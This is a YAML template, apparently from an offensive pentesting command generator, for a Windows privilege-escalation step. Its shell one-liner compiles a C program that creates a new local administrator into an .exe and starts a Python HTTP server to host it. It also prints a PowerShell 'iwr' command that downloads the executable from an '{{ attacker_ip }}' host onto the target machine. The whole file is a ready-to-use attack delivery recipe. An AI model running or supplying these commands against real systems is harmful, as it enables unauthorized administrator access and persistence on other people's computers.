---
metadata:
  filename: "windows-privesc-generate-exe-adding-local-administrator.yaml"
  tags: ["windows", "privesc"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  mkdir -p packstation/outbound; echo '{{ include('source_code/create-new-local-administrator.c') }}' > packstation/outbound/create-new-local-administrator.c; x86_64-w64-mingw32-gcc packstation/outbound/create-new-local-administrator.c -o packstation/outbound/create-new-local-administrator.exe; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----PowerShell-----                      '; \
  printf '%s\n' 'Deliver only (x64): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/create-new-local-administrator.exe -Outfile {{ delivery_path_windows }}\create-new-local-administrator.exe'; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
